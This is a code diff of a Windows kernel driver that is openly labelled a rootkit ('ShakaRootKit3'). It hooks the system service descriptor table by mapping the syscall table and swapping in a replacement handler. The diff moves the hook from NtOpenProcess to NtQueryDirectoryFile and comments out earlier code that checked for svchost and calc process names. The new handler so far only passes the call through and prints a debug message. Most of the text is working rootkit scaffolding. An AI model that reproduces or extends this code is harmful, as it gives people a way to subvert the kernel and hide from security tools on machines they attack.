@@ -4,7 +4,7 @@
 #define DeviceName L"\\Device\\hook"
 #define LnkDeviceName L"\\DosDevices\\hook" 
 
-// Rootkit :
+// Rootkit: C:\ShakaRootKit3\objchk_win7_x86\i386\shakadriver.sy
 
 #pragma pack(1)
 typedef struct ServiceDescriptorEntry {
@@ -38,19 +38,26 @@ NTSTATUS ZwQueryInformationProcess(
 
 NTSYSAPI
 NTSTATUS
-NTAPI NtOpenProcess(
+NTAPI NtQueryDirectoryFile(
 
 );
 
-typedef NTSTATUS (*NTOPENPROCESS)(
-   PHANDLE            ProcessHandle,
-   ACCESS_MASK        DesiredAccess,
-   POBJECT_ATTRIBUTES ObjectAttributes,
-   PCLIENT_ID         ClientId
+typedef NTSTATUS (*NTQUERYDIRECTORYFILE)(  
+  	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FILE_INFORMATION_CLASS FileInformationClass,
+	BOOLEAN                ReturnSingleEntry,
+	PUNICODE_STRING        FileName,
+	BOOLEAN                RestartScan
 );
 
 
-NTOPENPROCESS OldNtOpenProcess;
+NTQUERYDIRECTORYFILE OldNtQueryDirectoryFile;
 
 PVOID getProcessName(HANDLE ProcessHandle)
 {	
@@ -76,26 +83,41 @@ PVOID getProcessName(HANDLE ProcessHandle)
 }
 
 
-NTSTATUS NewNtOpenProcess(
-   PHANDLE            ProcessHandle,
-   ACCESS_MASK        DesiredAccess,
-   POBJECT_ATTRIBUTES ObjectAttributes,
-   PCLIENT_ID         ClientId
+NTSTATUS NewNtQueryDirectoryFile(
+  	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FILE_INFORMATION_CLASS FileInformationClass,
+	BOOLEAN                ReturnSingleEntry,
+	PUNICODE_STRING        FileName,
+	BOOLEAN                RestartScan
 )
 {
-	UNICODE_STRING calcName, svchostName;
+	/*UNICODE_STRING calcName, svchostName;
 	PVOID parentProcess, childProcess;
 	PUNICODE_STRING parentName, childName;
+	*/
 	NTSTATUS rc;
 
-	rc = (*OldNtOpenProcess) (
-		ProcessHandle, 
-		DesiredAccess, 
-		ObjectAttributes, 
-		ClientId
+	rc = (*OldNtQueryDirectoryFile) (
+		FileHandle,
+		Event,
+		ApcRoutine,
+		ApcContext,
+		IoStatusBlock,
+		FileInformation,
+		Length,
+		FileInformationClass,
+		ReturnSingleEntry,
+		FileName,
+		RestartScan
 	);
 	
-	RtlInitUnicodeString(&svchostName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe"); 
+	/*RtlInitUnicodeString(&svchostName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe"); 
 	RtlInitUnicodeString(&calcName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\calc.exe");   	
 				
 	parentProcess = getProcessName(ZwCurrentProcess());
@@ -123,7 +145,9 @@ NTSTATUS NewNtOpenProcess(
 	if (parentProcess != NULL)
 		ExFreePoolWithTag(parentProcess, 'Efe');
 	if (childProcess != NULL)
-		ExFreePoolWithTag(childProcess, 'Efe');
+		ExFreePoolWithTag(childProcess, 'Efe');*/
+
+	DbgPrint("#=== ShakaHook NtQueryDirectoryFile ===#\n");
 
 	return rc;
 }
@@ -141,9 +165,9 @@ NTSTATUS Hook_Function()
 	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
 
 	__try{
-		OldNtOpenProcess = (PVOID) InterlockedExchange(  
-			(PLONG) &MappedSystemCallTable[190], 
-			(LONG) NewNtOpenProcess 
+		OldNtQueryDirectoryFile = (PVOID) InterlockedExchange(  
+			(PLONG) &MappedSystemCallTable[223], 
+			(LONG) NewNtQueryDirectoryFile
 		);
 		IsHooked = 1; 
 		DbgPrint("DriverEntry: Hook success");
@@ -161,8 +185,8 @@ void Unhook_fonction()
 	__try
 	{
 		InterlockedExchange( 
-			(PLONG) &MappedSystemCallTable[190],
-			(LONG) OldNtOpenProcess
+			(PLONG) &MappedSystemCallTable[223],
+			(LONG) OldNtQueryDirectoryFile
 		);
 		IsHooked = 0;
 	}
@@ -215,7 +239,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPa
 	PDEVICE_OBJECT pDeviceObject=NULL;
 	UNICODE_STRING usDriverName,usLnkName;
 
-	DbgPrint("Hello from KernelLand master 2\n");
+	DbgPrint("Hello from KernelLand master 3\n");
 	
 	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
 	pDriverObject->MajorFunction[i]=DriverDispatch;
